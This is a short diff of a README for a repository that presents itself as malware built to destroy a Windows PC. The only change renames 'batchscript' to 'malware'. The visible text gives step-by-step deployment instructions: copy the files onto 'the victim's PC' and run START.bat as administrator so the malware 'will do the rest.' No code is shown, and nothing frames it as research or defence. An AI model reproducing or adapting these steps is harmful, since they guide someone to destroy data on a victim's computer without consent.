@@ -14,7 +14,7 @@ A malware to destroy a Windows PC.
 =====================
 1. Download the zip file which contains all the files from this github repository.
 2. Unzip the zip file and delete extra files. (e.g. the license and README files)
-3. Put all the files into your desired directory on the victim's PC. **Please make sure all the files are stored into the same folder, otherwise the batchscript won't execute properly.**
+3. Put all the files into your desired directory on the victim's PC. **Please make sure all the files are stored into the same folder, otherwise the malware won't execute properly.**
 4. Execute the "START.bat" file as admin on the victim's PC.
 5. After all of this, the malware will do the rest.
 
